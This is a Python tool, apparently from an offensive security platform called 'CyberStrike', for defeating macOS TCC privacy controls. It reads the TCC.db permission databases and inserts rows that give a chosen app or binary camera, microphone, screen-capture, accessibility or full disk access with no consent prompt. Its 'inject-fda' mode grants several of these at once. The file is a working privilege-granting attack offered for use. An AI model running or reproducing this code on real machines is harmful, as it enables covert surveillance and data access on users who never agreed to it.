#!/usr/bin/env python3
"""
tcc_bypass.py — Bypass macOS TCC (Transparency, Consent, and Control) framework.

Manipulates TCC.db to grant access to protected resources (camera, microphone,
screen recording, full disk access, etc.) without user consent dialogs.

Requires: root privileges for system TCC.db; user-level for per-user TCC.db.

Part of CyberStrike offensive security platform.
"""

import argparse
import json
import os
import shutil
import signal
import sqlite3
import subprocess
import sys
import tempfile
import time
from datetime import datetime
from pathlib import Path


TCC_SERVICES = [
    "kTCCServiceAccessibility",
    "kTCCServiceCamera",
    "kTCCServiceMicrophone",
    "kTCCServiceScreenCapture",
    "kTCCServiceSystemPolicyAllFiles",
    "kTCCServiceSystemPolicyDesktopFolder",
    "kTCCServiceSystemPolicyDocumentsFolder",
    "kTCCServiceSystemPolicyDownloadsFolder",
    "kTCCServiceSystemPolicyNetworkVolumes",
    "kTCCServiceSystemPolicyRemovableVolumes",
    "kTCCServiceAddressBook",
    "kTCCServiceCalendar",
    "kTCCServiceReminders",
    "kTCCServicePhotos",
    "kTCCServiceMediaLibrary",
    "kTCCServiceListenEvent",
    "kTCCServicePostEvent",
]


class TccBypasser:
    def __init__(self, args):
        self.args = args
        self.event_count = 0
        self.start_time = None
        self.running = True
        self.temp_files = []

    def check_root(self):
        if os.geteuid() != 0:
            print(
                "WARNING: Running without root — can only modify current user's TCC.db.",
                file=sys.stderr,
            )

    def print_banner(self):
        print("=" * 60)
        print("CyberStrike — TCC Bypass (macOS)")
        print("=" * 60)
        print(f"PID:      {os.getpid()}")
        print(f"Action:   {self.args.action}")
        print(f"Target:   {self.args.bundle_id or 'N/A'}")
        print(f"Service:  {self.args.service or 'all'}")
        print(f"Output:   {'JSON' if self.args.json_output else 'text'}")
        print(f"Started:  {datetime.now().isoformat()}")
        print("=" * 60)
        print()

    def signal_handler(self, _signum, _frame):
        self.running = False

    def emit(self, record):
        self.event_count += 1
        if self.args.json_output:
            print(json.dumps(record), flush=True)
        else:
            status = record.get("status", "N/A")
            print(
                f"[{status:<8}] service={record.get('service', 'N/A'):<40} "
                f"client={record.get('client', 'N/A'):<30} "
                f"allowed={record.get('allowed', 'N/A')}",
                flush=True,
            )

    def get_tcc_paths(self):
        """Get TCC.db paths (user + system)."""
        paths = []
        user_tcc = Path.home() / "Library/Application Support/com.apple.TCC/TCC.db"
        if user_tcc.exists():
            paths.append(("user", str(user_tcc)))
        system_tcc = Path("/Library/Application Support/com.apple.TCC/TCC.db")
        if system_tcc.exists():
            paths.append(("system", str(system_tcc)))
        return paths

    def get_macos_version(self):
        """Get macOS major version for schema compatibility."""
        try:
            result = subprocess.run(
                ["sw_vers", "-productVersion"],
                capture_output=True,
                text=True,
                timeout=5,
            )
            if result.returncode == 0:
                parts = result.stdout.strip().split(".")
                return int(parts[0]) if parts else 0
        except Exception:
            pass
        return 0

    def check_sip_status(self):
        """Check if SIP is enabled (affects TCC.db modification)."""
        try:
            result = subprocess.run(
                ["csrutil", "status"], capture_output=True, text=True, timeout=5
            )
            if result.returncode == 0:
                output = result.stdout.strip().lower()
                return "enabled" in output
        except Exception:
            pass
        return True

    def dump_tcc(self):
        """Dump all TCC entries from all accessible databases."""
        tcc_paths = self.get_tcc_paths()
        if not tcc_paths:
            if not self.args.json_output:
                print("[!] No TCC.db files found or accessible", flush=True)
            return

        for scope, db_path in tcc_paths:
            if not self.running:
                break
            try:
                temp_db = tempfile.mktemp(suffix=".db")
                self.temp_files.append(temp_db)
                shutil.copy2(db_path, temp_db)

                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()

                try:
                    cursor.execute(
                        "SELECT service, client, client_type, auth_value, "
                        "auth_reason, last_modified FROM access"
                    )
                    columns = [
                        "service",
                        "client",
                        "client_type",
                        "auth_value",
                        "auth_reason",
                        "last_modified",
                    ]
                except sqlite3.OperationalError:
                    cursor.execute(
                        "SELECT service, client, client_type, allowed, "
                        "prompt_count, last_modified FROM access"
                    )
                    columns = [
                        "service",
                        "client",
                        "client_type",
                        "allowed",
                        "prompt_count",
                        "last_modified",
                    ]

                for row in cursor.fetchall():
                    if not self.running:
                        break
                    entry = dict(zip(columns, row))
                    auth_val = entry.get("auth_value", entry.get("allowed", 0))
                    self.emit(
                        {
                            "timestamp": datetime.now().isoformat(),
                            "action": "dump",
                            "scope": scope,
                            "db_path": db_path,
                            "service": entry.get("service", ""),
                            "client": entry.get("client", ""),
                            "client_type": entry.get("client_type", 0),
                            "allowed": auth_val,
                            "status": "allowed" if auth_val == 2 else "denied",
                            "last_modified": entry.get("last_modified", 0),
                        }
                    )
                conn.close()
            except PermissionError:
                if not self.args.json_output:
                    print(f"[!] Permission denied: {db_path}", flush=True)
            except Exception as e:
                if not self.args.json_output:
                    print(f"[!] Error reading {db_path}: {e}", flush=True)

    def grant_access(self):
        """Grant TCC access for a bundle ID to a service."""
        bundle_id = self.args.bundle_id
        service = self.args.service
        if not bundle_id:
            print("ERROR: --bundle-id required for grant action", file=sys.stderr)
            return
        if not service:
            print("ERROR: --service required for grant action", file=sys.stderr)
            return

        sip_enabled = self.check_sip_status()
        if sip_enabled:
            self.emit(
                {
                    "timestamp": datetime.now().isoformat(),
                    "action": "grant",
                    "service": service,
                    "client": bundle_id,
                    "status": "sip_enabled",
                    "allowed": "N/A",
                    "message": "SIP is enabled — TCC.db is protected. "
                    "Direct modification requires SIP disabled or "
                    "an FDA-entitled helper process.",
                }
            )

        macos_ver = self.get_macos_version()
        tcc_paths = self.get_tcc_paths()
        target_scope = self.args.scope or "user"

        for scope, db_path in tcc_paths:
            if scope != target_scope:
                continue
            if not self.running:
                break

            try:
                conn = sqlite3.connect(db_path)
                cursor = conn.cursor()

                if macos_ver >= 12:
                    cursor.execute(
                        "INSERT OR REPLACE INTO access "
                        "(service, client, client_type, auth_value, auth_reason, "
                        "auth_version, flags, last_modified) "
                        "VALUES (?, ?, 0, 2, 4, 1, 0, ?)",
                        (service, bundle_id, int(time.time())),
                    )
                else:
                    cursor.execute(
                        "INSERT OR REPLACE INTO access "
                        "(service, client, client_type, allowed, "
                        "prompt_count, last_modified) "
                        "VALUES (?, ?, 0, 1, 1, ?)",
                        (service, bundle_id, int(time.time())),
                    )

                conn.commit()
                conn.close()

                self.emit(
                    {
                        "timestamp": datetime.now().isoformat(),
                        "action": "grant",
                        "scope": scope,
                        "db_path": db_path,
                        "service": service,
                        "client": bundle_id,
                        "allowed": 2 if macos_ver >= 12 else 1,
                        "status": "granted",
                    }
                )
            except sqlite3.OperationalError as e:
                err_str = str(e).lower()
                if "readonly" in err_str or "locked" in err_str:
                    self.emit(
                        {
                            "timestamp": datetime.now().isoformat(),
                            "action": "grant",
                            "scope": scope,
                            "service": service,
                            "client": bundle_id,
                            "status": "protected",
                            "allowed": "N/A",
                            "message": f"Database protected: {e}. "
                            "Try with SIP disabled or use tccutil.",
                        }
                    )
                else:
                    raise
            except PermissionError:
                self.emit(
                    {
                        "timestamp": datetime.now().isoformat(),
                        "action": "grant",
                        "scope": scope,
                        "service": service,
                        "client": bundle_id,
                        "status": "permission_denied",
                        "allowed": "N/A",
                    }
                )
            except Exception as e:
                if not self.args.json_output:
                    print(f"[!] Error modifying {db_path}: {e}", flush=True)

    def reset_service(self):
        """Reset TCC decisions for a service (uses tccutil)."""
        service = self.args.service
        if not service:
            print("ERROR: --service required for reset action", file=sys.stderr)
            return

        try:
            cmd = ["tccutil", "reset", service]
            if self.args.bundle_id:
                cmd.append(self.args.bundle_id)
            result = subprocess.run(
                cmd, capture_output=True, text=True, timeout=10
            )
            self.emit(
                {
                    "timestamp": datetime.now().isoformat(),
                    "action": "reset",
                    "service": service,
                    "client": self.args.bundle_id or "all",
                    "status": "success" if result.returncode == 0 else "failed",
                    "allowed": "N/A",
                    "output": result.stdout.strip() or result.stderr.strip(),
                }
            )
        except Exception as e:
            if not self.args.json_output:
                print(f"[!] Error running tccutil: {e}", flush=True)

    def inject_fda(self):
        """Attempt to inject Full Disk Access via automation."""
        bundle_id = self.args.bundle_id or "/usr/bin/python3"

        fda_services = [
            "kTCCServiceSystemPolicyAllFiles",
            "kTCCServiceAccessibility",
            "kTCCServiceScreenCapture",
        ]

        for service in fda_services:
            if not self.running:
                break
            self.args.service = service
            self.grant_access()

    def run(self):
        self.check_root()
        self.print_banner()

        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)

        self.start_time = time.monotonic()

        action = self.args.action
        if action == "dump":
            self.dump_tcc()
        elif action == "grant":
            self.grant_access()
        elif action == "reset":
            self.reset_service()
        elif action == "inject-fda":
            self.inject_fda()
        else:
            print(f"ERROR: Unknown action: {action}", file=sys.stderr)

        self.cleanup()

    def cleanup(self):
        for temp_file in self.temp_files:
            try:
                os.unlink(temp_file)
            except OSError:
                pass
        print(f"\n--- tcc_bypass summary ---")
        print(f"Entries processed: {self.event_count}")
        if self.start_time:
            print(f"Duration: {time.monotonic() - self.start_time:.1f}s")
        print("Done.")


def main():
    parser = argparse.ArgumentParser(
        description="Bypass macOS TCC framework for resource access.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Services:\n"
            "  kTCCServiceCamera, kTCCServiceMicrophone,\n"
            "  kTCCServiceScreenCapture, kTCCServiceSystemPolicyAllFiles,\n"
            "  kTCCServiceAccessibility, kTCCServicePhotos, ...\n\n"
            "Examples:\n"
            "  sudo python3 tcc_bypass.py --action dump\n"
            "  sudo python3 tcc_bypass.py --action grant --bundle-id com.example.app "
            "--service kTCCServiceCamera\n"
            "  sudo python3 tcc_bypass.py --action inject-fda --bundle-id /usr/bin/python3\n"
            "  sudo python3 tcc_bypass.py --action reset --service kTCCServiceCamera\n"
        ),
    )
    parser.add_argument(
        "--action",
        choices=["dump", "grant", "reset", "inject-fda"],
        default="dump",
        help="Action to perform (default: dump)",
    )
    parser.add_argument("--bundle-id", type=str, default=None, help="Target bundle ID or binary path")
    parser.add_argument("--service", type=str, default=None, help="TCC service name")
    parser.add_argument(
        "--scope",
        choices=["user", "system"],
        default="user",
        help="TCC database scope (default: user)",
    )
    parser.add_argument("--json-output", action="store_true", default=False, help="Output as JSON lines")
    args = parser.parse_args()

    bypasser = TccBypasser(args)
    bypasser.run()


if __name__ == "__main__":
    main()
